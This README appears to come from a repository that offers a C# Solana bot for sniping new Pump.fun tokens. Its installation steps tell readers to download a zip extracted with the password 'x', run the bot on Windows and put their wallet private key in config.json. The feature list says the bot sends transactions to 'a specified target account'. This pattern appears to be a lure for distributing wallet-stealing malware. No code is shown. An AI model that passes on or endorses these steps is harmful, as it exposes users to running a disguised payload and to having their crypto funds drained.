# Overview

Bot for sniping tokens listed on Pump.fun in the Solana network using C# and the Solnet library.

## Features

- Connects to the Solana MainNet
- Creates and sends transactions to a specified target account
- Configurable via environment variables.

## Installation
- [Clone](https://github.com/sui-sensei/pump.fun/archive/refs/heads/main.zip) the repository
- extract archive with pass `x`
- create a `config.json` in the project's root directory and define your environment variables. You can use the provided `config.json`
- run the bot.

## Configuration

The bot uses environment variables for configuration. Create a `config.json` file in the root directory and set the following variables:

- `maxPosition`: The amount of sol for which a particular token will be purchased
- `timeoutScan`: Time interval followed by interaction
- `rpc`: Rpc to which the wallet will be connected
- `solPrivate`: Your Solana wallet's private key.


Example `config.json` file:

```json
{
  "mainSettings": { 
    "maxPosition": "0.1",
    "timeoutScan": "30",
    "rpc": "https://<your-solana-rpc>.com:<port>",
    "solPrivate": "<your-solana-private-key>"
  }
}
```
### Prerequisites

1. **Framework 4.0 and more**

2. **Windows 10/11**

3. **Solnet Libraries**: The project uses the Solnet library to interact with the Solana blockchain.

4. **.NET SDK**: Ensure you have the .NET SDK installed. You can download it from the [.NET official site](https://dotnet.microsoft.com/download).

## Usage

1. **Automated Fund Transfers**

   The bot can be used to automate the process of transferring funds between accounts. This can be particularly useful for managing multiple wallets or automating recurring payments.

2. **Sniping Opportunities**

   Although the current example focuses on basic transactions, the bot can be extended to monitor the blockchain for specific opportunities, such as sniping newly listed tokens or participating in limited-time offers on platforms like pump.fun.

3. **Interacting with Smart Contracts**

   With further development, the bot can be programmed to interact with Solana smart contracts, enabling it to participate in decentralized finance (DeFi) activities, execute trades, or interact with decentralized applications (dApps).

4. **Batch Transactions**

   The bot can be adapted to perform batch transactions, sending multiple transactions in quick succession. This is useful for distributing funds to multiple recipients or executing multiple operations in a short period.
